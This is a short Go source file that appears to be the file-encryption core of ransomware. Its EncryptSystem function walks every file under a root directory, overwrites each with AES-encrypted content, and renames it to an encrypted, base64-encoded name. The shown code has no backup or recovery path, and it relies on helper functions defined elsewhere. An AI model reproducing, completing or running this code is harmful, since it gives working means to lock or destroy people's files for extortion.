package main

import (
	b64 "encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func GetFileContent(fileName string) []byte {
	data, err := ioutil.ReadFile(fileName)
	checkError(err)
	return data
}

func WriteToFile(fileName string, data []byte) {
	err := ioutil.WriteFile(fileName, data, 0644)
	checkError(err)
}

func EncryptFile(fileName string, key []byte) {
	plainText := GetFileContent(fileName)
	encryptedData := EncryptDataAES(key, plainText)
	WriteToFile(fileName, encryptedData)
}

func EncryptFileName(fileName string, key []byte) string {
	fileNameBytes := []byte(fileName)
	encryptedFileName := EncryptDataAES(key, fileNameBytes)
	newFileName := b64.StdEncoding.EncodeToString(encryptedFileName)
	return newFileName
}

func EncryptSystem(root string, key []byte) {
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if !d.IsDir() {

			// Debug
			fmt.Println("PATH: ", GetFileDirectory(path, d.Name()))
			fmt.Println("NAME: ", d.Name())

			fileName := d.Name()
			originalPath := path
			newFileName := EncryptFileName(fileName, key)
			newPath := GetFileDirectory(path, fileName) + newFileName
			EncryptFile(originalPath, key)
			err := os.Rename(originalPath, newPath)
			checkError(err)
		}
		return nil
	})
	checkError(err)
}

func GetFileDirectory(filePath string, fileName string) string {
	basePath := strings.ReplaceAll(filePath, fileName, "")
	return basePath
}
